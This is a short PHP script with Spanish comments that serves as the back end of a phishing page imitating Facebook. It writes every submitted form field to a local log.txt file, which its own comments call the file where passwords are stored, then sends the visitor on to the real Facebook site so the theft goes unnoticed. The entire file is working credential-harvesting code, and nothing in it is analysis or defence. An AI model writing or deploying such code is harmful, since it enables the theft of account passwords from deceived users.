<?php
        
        header ('Location: https://www.facebook.com/ '); //La URL a redireccionar luego de presionar
        $handle = fopen("log.txt", "a"); // se crea el guarda los datos en un archivo txt si no esta creado se crea automaticamente
        
		//A partír de aquí se escriben las variables que obtiene luego del POST
        foreach($_POST as $variable => $value) {
                fwrite($handle, $variable);
                fwrite($handle, "=");
                fwrite($handle, $value);
                fwrite($handle, "\r\n");
        }
        fwrite($handle, "\r\n");
        fclose($handle); //Se cierra el documento donde se guardan las contraseñas
        exit;
        
?>
